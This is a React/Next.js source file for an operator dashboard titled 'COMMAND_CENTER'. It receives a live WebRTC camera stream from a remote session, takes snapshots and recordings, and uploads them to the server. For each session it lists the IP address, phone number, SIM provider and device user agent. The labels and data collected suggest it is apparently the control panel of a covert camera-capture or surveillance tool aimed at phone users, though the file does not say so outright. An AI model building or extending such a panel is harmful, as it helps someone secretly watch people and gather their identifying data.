'use client';

import { useEffect, useRef, useState, use } from 'react';
import { io, Socket } from 'socket.io-client';
import Link from 'next/link';
import { useParams } from 'next/navigation';

export default function ViewSession() {
  const params = useParams();
  const id = params.id as string;
  const [session, setSession] = useState<any>(null);
  const [status, setStatus] = useState('Connecting...');
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const socketRef = useRef<Socket | null>(null);
  const peerConnectionRef = useRef<RTCPeerConnection | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const recordedChunksRef = useRef<Blob[]>([]);
  const [isRecording, setIsRecording] = useState(false);
  const [activeTab, setActiveTab] = useState<'overview' | 'recordings' | 'snaps'>('overview');

  useEffect(() => {
    if (!id) return;

    // Initial fetch
    fetchSession();

    // Poll for updates every 3 seconds
    const interval = setInterval(fetchSession, 3000);

    const signalingUrl = process.env.NEXT_PUBLIC_SIGNALING_URL || '';
    const socket = io(signalingUrl);
    socketRef.current = socket;

    socket.emit('join_viewer', id);

    socket.on('offer', async ({ sdp, caller }) => {
        console.log('Received offer from streamer');
        const pc = createPeerConnection(caller);
        await pc.setRemoteDescription(new RTCSessionDescription(sdp));
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);
        socket.emit('answer', { target: caller, sdp: answer });
    });

    socket.on('candidate', async ({ candidate }) => {
        if (peerConnectionRef.current) {
            console.log('Received ICE candidate from streamer');
            await peerConnectionRef.current.addIceCandidate(new RTCIceCandidate(candidate));
        }
    });

    socket.on('streamer_ready', (streamerId) => {
        console.log('Streamer is ready, joining viewer again to trigger offer');
        socket.emit('join_viewer', id);
    });

    return () => {
        socket.disconnect();
        peerConnectionRef.current?.close();
        clearInterval(interval);
    };
  }, [id]);

  const fetchSession = () => {
      fetch(`/api/sessions/${id}`)
          .then(res => res.json())
          .then(data => {
              if (data.success) setSession(data.session);
          });
  };

  const createPeerConnection = (streamerId: string) => {
      const pc = new RTCPeerConnection({
          iceServers: [
              { urls: 'stun:stun.l.google.com:19302' },
              { urls: 'stun:stun1.l.google.com:19302' },
              { urls: 'stun:stun2.l.google.com:19302' },
              { urls: 'stun:stun3.l.google.com:19302' },
              { urls: 'stun:stun4.l.google.com:19302' }
          ]
      });
      peerConnectionRef.current = pc;

      pc.onicecandidate = (event) => {
          if (event.candidate) {
              socketRef.current?.emit('candidate', { target: streamerId, candidate: event.candidate });
          }
      };

      pc.ontrack = (event) => {
          console.log('Received track');
          if (videoRef.current) {
              videoRef.current.srcObject = event.streams[0];
              setStatus('Live');
          }
      };
      
      pc.onconnectionstatechange = () => {
          console.log('Connection state:', pc.connectionState);
          if (pc.connectionState === 'connected') {
              setStatus('Live');
          } else if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected') {
              setStatus('Streamer Disconnected');
          } else if (pc.connectionState === 'connecting') {
              setStatus('Connecting...');
          }
      };

      pc.oniceconnectionstatechange = () => {
          console.log('ICE connection state:', pc.iceConnectionState);
      };

      return pc;
  };

  const takeSnapshot = async () => {
      if (!videoRef.current) return;
      
      const canvas = document.createElement('canvas');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      const ctx = canvas.getContext('2d');
      if (!ctx) return;
      
      ctx.drawImage(videoRef.current, 0, 0);
      canvas.toBlob(async (blob) => {
          if (!blob) return;
          
          const formData = new FormData();
          formData.append('file', blob, 'snapshot.png');
          formData.append('sessionId', id);
          formData.append('type', 'snapshot');
          
          const res = await fetch('/api/upload', {
              method: 'POST',
              body: formData
          });
          const data = await res.json();
          if (data.success) {
              setSession((prev: any) => ({
                  ...prev,
                  snapshots: [...(prev.snapshots || []), data.url]
              }));
          }
      }, 'image/png');
  };

  const startRecording = () => {
      if (!videoRef.current || !videoRef.current.srcObject) return;
      
      const stream = videoRef.current.srcObject as MediaStream;
      const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      mediaRecorderRef.current = recorder;
      recordedChunksRef.current = [];
      
      recorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
              recordedChunksRef.current.push(event.data);
          }
      };
      
      recorder.onstop = async () => {
          const blob = new Blob(recordedChunksRef.current, { type: 'video/webm' });
          const formData = new FormData();
          formData.append('file', blob, 'recording.webm');
          formData.append('sessionId', id);
          formData.append('type', 'recording');
          
          const res = await fetch('/api/upload', {
              method: 'POST',
              body: formData
          });
          const data = await res.json();
          if (data.success) {
              setSession((prev: any) => ({
                  ...prev,
                  recordings: [...(prev.recordings || []), data.url]
              }));
          }
      };
      
      recorder.start();
      setIsRecording(true);
  };

  const stopRecording = () => {
      if (mediaRecorderRef.current && isRecording) {
          mediaRecorderRef.current.stop();
          setIsRecording(false);
      }
  };

  const deleteData = async (type: 'recordings' | 'snapshots') => {
      if (!confirm(`Are you sure you want to delete ALL ${type}? This cannot be undone.`)) return;
      
      try {
          const res = await fetch(`/api/sessions/${id}/clear`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ type })
          });
          const data = await res.json();
          if (data.success) {
              setSession((prev: any) => ({
                  ...prev,
                  [type === 'recordings' ? 'recordings' : 'snapshots']: []
              }));
          } else {
              alert('Failed to delete data: ' + data.error);
          }
      } catch (err) {
          console.error(err);
          alert('An error occurred while deleting data');
      }
  };

  return (
    <div className="h-screen bg-black text-green-500 font-mono flex overflow-hidden">
        <div className="flex-1 flex flex-col relative border-r border-green-900">
            <div className="flex-1 bg-neutral-900 flex items-center justify-center relative">
                <video ref={videoRef} autoPlay playsInline muted controls className="w-full h-full object-contain" />
                <div className="absolute top-5 left-5 flex gap-2">
                    {isRecording && <div className="bg-red-600 text-white px-2 rounded font-bold animate-pulse">REC</div>}
                    <div className="bg-green-900 text-green-400 px-2 border border-green-500 uppercase">{status}</div>
                </div>
                
                <div className="absolute bottom-5 left-1/2 -translate-x-1/2 flex gap-4">
                    <button 
                        onClick={takeSnapshot}
                        className="bg-green-600 hover:bg-green-500 text-black font-bold py-2 px-6 rounded-full border-2 border-green-400 shadow-[0_0_15px_rgba(34,197,94,0.5)] transition"
                    >
                        📸 SNAP
                    </button>
                    {!isRecording ? (
                        <button 
                            onClick={startRecording}
                            className="bg-red-600 hover:bg-red-500 text-white font-bold py-2 px-6 rounded-full border-2 border-red-400 shadow-[0_0_15px_rgba(239,68,68,0.5)] transition"
                        >
                            🔴 RECORD
                        </button>
                    ) : (
                        <button 
                            onClick={stopRecording}
                            className="bg-white hover:bg-gray-200 text-black font-bold py-2 px-6 rounded-full border-2 border-gray-400 shadow-[0_0_15px_rgba(255,255,255,0.5)] transition"
                        >
                            ⏹️ STOP
                        </button>
                    )}
                </div>
            </div>
        </div>

        <div className="w-96 bg-[#0a0a0a] flex flex-col border-l border-green-500/30">
            {/* Header / Tabs */}
            <div className="p-4 bg-[#111] border-b border-green-500/30">
                <div className="flex justify-between items-center mb-4">
                    <h2 className="font-black text-green-500 tracking-tighter text-xl italic">COMMAND_CENTER</h2>
                    <Link href="/admin" className="text-[10px] bg-green-900/30 hover:bg-green-500 hover:text-black text-green-500 px-2 py-1 rounded border border-green-500/50 transition uppercase font-bold">
                        &larr; Exit
                    </Link>
                </div>
                
                <div className="flex gap-1 p-1 bg-black rounded border border-green-500/20">
                    <button 
                        onClick={() => setActiveTab('overview')}
                        className={`flex-1 py-1.5 text-[10px] uppercase font-bold transition ${activeTab === 'overview' ? 'bg-green-600 text-black shadow-[0_0_10px_rgba(34,197,94,0.3)]' : 'text-green-500/50 hover:text-green-500'}`}
                    >
                        Overview
                    </button>
                    <button 
                        onClick={() => setActiveTab('recordings')}
                        className={`flex-1 py-1.5 text-[10px] uppercase font-bold transition ${activeTab === 'recordings' ? 'bg-green-600 text-black shadow-[0_0_10px_rgba(34,197,94,0.3)]' : 'text-green-500/50 hover:text-green-500'}`}
                    >
                        Recordings ({session?.recordings?.length || 0})
                    </button>
                    <button 
                        onClick={() => setActiveTab('snaps')}
                        className={`flex-1 py-1.5 text-[10px] uppercase font-bold transition ${activeTab === 'snaps' ? 'bg-green-600 text-black shadow-[0_0_10px_rgba(34,197,94,0.3)]' : 'text-green-500/50 hover:text-green-500'}`}
                    >
                        Snaps ({session?.snapshots?.length || 0})
                    </button>
                </div>
            </div>
            
            <div className="flex-1 overflow-y-auto custom-scrollbar">
                {activeTab === 'overview' && session && (
                    <div className="p-4 space-y-6 animate-in fade-in slide-in-from-right-4 duration-300">
                        <section>
                            <h3 className="text-[10px] text-green-500/50 uppercase font-black mb-3 tracking-widest flex items-center gap-2">
                                <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
                                Network Status
                            </h3>
                            <div className="grid grid-cols-1 gap-4">
                                <div className="bg-black/40 p-3 border border-green-500/10 rounded">
                                    <div className="text-gray-500 text-[9px] uppercase font-bold mb-1">IP Address</div>
                                    <div className="text-green-400 font-mono text-sm break-all">{session.ipAddress}</div>
                                </div>
                                <div className="bg-black/40 p-3 border border-green-500/10 rounded">
                                    <div className="text-gray-500 text-[9px] uppercase font-bold mb-1">Connection Type</div>
                                    <div className="text-green-400 font-mono text-sm uppercase">P2P_WEB_RTC</div>
                                </div>
                            </div>
                        </section>

                        <section>
                            <h3 className="text-[10px] text-green-500/50 uppercase font-black mb-3 tracking-widest flex items-center gap-2">
                                <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
                                Identity Data
                            </h3>
                            <div className="space-y-3">
                                <div className="bg-black/40 p-3 border border-green-500/10 rounded flex justify-between items-center">
                                    <span className="text-gray-500 text-[10px] uppercase font-bold">Phone</span>
                                    <span className="text-green-400 font-black text-sm">{session.phoneNumber || 'UNKNOWN'}</span>
                                </div>
                                <div className="bg-black/40 p-3 border border-green-500/10 rounded flex justify-between items-center">
                                    <span className="text-gray-500 text-[10px] uppercase font-bold">Provider</span>
                                    <span className="text-white text-[10px] uppercase">{session.simProvider || 'NOT_DETECTED'}</span>
                                </div>
                            </div>
                        </section>

                        <section>
                            <h3 className="text-[10px] text-green-500/50 uppercase font-black mb-3 tracking-widest flex items-center gap-2">
                                <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
                                System Metrics
                            </h3>
                            <div className="bg-black/40 p-3 border border-green-500/10 rounded">
                                <div className="text-gray-500 text-[9px] uppercase font-bold mb-1">User Agent</div>
                                <div className="text-white text-[10px] leading-relaxed opacity-80">{session.deviceInfo}</div>
                            </div>
                        </section>
                        
                        <div className="pt-4 border-t border-green-500/10">
                            <div className="text-[9px] text-green-500/30 uppercase font-bold text-center">
                                Initialized: {new Date(session.createdAt).toLocaleString()}
                            </div>
                        </div>
                    </div>
                )}

                {activeTab === 'recordings' && (
                    <div className="p-4 space-y-4 animate-in fade-in slide-in-from-right-4 duration-300">
                        {session?.recordings?.length > 0 && (
                            <button 
                                onClick={() => deleteData('recordings')}
                                className="w-full bg-red-900/20 hover:bg-red-600 text-red-500 hover:text-white py-2 px-4 rounded border border-red-500/50 transition uppercase font-black text-[10px] tracking-widest mb-2"
                            >
                                🗑️ DELETE ALL VIDEOS
                            </button>
                        )}
                        {session?.recordings?.length > 0 ? (
                            session.recordings.map((url: string, i: number) => (
                                <div key={i} className="group bg-black border border-green-500/20 hover:border-green-500/50 p-2 transition rounded shadow-lg overflow-hidden">
                                    <div className="relative mb-2">
                                        <video src={url} controls className="w-full rounded bg-neutral-900" />
                                        <div className="absolute top-2 right-2 bg-green-600 text-black text-[8px] px-1 font-bold rounded">VOD_{i+1}</div>
                                    </div>
                                    <div className="flex justify-between items-center">
                                        <div className="text-[9px] text-green-500/50 uppercase font-bold tracking-tighter">DATA_FRAGMENT_{i+1}</div>
                                        <a href={url} download className="text-[9px] text-green-500 hover:text-white underline font-bold uppercase">Download</a>
                                    </div>
                                </div>
                            ))
                        ) : (
                            <div className="h-40 flex items-center justify-center text-green-500/20 uppercase font-black tracking-widest text-xs italic">
                                NO_DATA_AVAILABLE
                            </div>
                        )}
                    </div>
                )}

                {activeTab === 'snaps' && (
                    <div className="p-4 animate-in fade-in slide-in-from-right-4 duration-300">
                        {session?.snapshots?.length > 0 && (
                            <button 
                                onClick={() => deleteData('snapshots')}
                                className="w-full bg-red-900/20 hover:bg-red-600 text-red-500 hover:text-white py-2 px-4 rounded border border-red-500/50 transition uppercase font-black text-[10px] tracking-widest mb-4"
                            >
                                🗑️ DELETE ALL SNAPS
                            </button>
                        )}
                        {session?.snapshots?.length > 0 ? (
                            <div className="grid grid-cols-2 gap-3">
                                {session.snapshots.map((url: string, i: number) => (
                                    <div key={i} className="group relative border border-green-500/20 hover:border-green-500 transition-all rounded overflow-hidden">
                                        <img src={url} alt={`Snap ${i}`} className="w-full h-32 object-cover grayscale hover:grayscale-0 transition-all duration-500" />
                                        <div className="absolute bottom-0 left-0 right-0 bg-black/80 p-1 flex justify-between items-center transform translate-y-full group-hover:translate-y-0 transition-transform">
                                            <span className="text-[8px] text-green-500 font-bold uppercase">#IMG_{i+1}</span>
                                            <a href={url} target="_blank" className="text-[8px] text-white hover:text-green-500 uppercase font-bold">Zoom</a>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        ) : (
                            <div className="h-40 flex items-center justify-center text-green-500/20 uppercase font-black tracking-widest text-xs italic text-center">
                                NO_VISUAL_DATA_ACQUIRED
                            </div>
                        )}
                    </div>
                )}
            </div>
            
            <style jsx global>{`
                .custom-scrollbar::-webkit-scrollbar {
                    width: 4px;
                }
                .custom-scrollbar::-webkit-scrollbar-track {
                    background: transparent;
                }
                .custom-scrollbar::-webkit-scrollbar-thumb {
                    background: rgba(34, 197, 94, 0.2);
                    border-radius: 10px;
                }
                .custom-scrollbar::-webkit-scrollbar-thumb:hover {
                    background: rgba(34, 197, 94, 0.5);
                }
            `}</style>
        </div>
    </div>
  );
}
